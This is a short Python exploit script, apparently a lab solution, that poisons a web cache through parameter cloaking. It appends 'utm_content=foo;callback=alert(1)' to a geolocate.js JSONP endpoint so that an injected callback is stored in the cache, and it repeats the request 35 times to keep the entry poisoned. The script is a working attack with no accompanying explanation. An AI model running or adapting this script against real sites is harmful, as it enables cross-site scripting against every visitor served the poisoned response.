import time
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
burp2_url = sys.argv[1] + '/js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)'

session = requests.Session()

for _ in range(35):
        session.get(burp2_url)
        time.sleep(1)

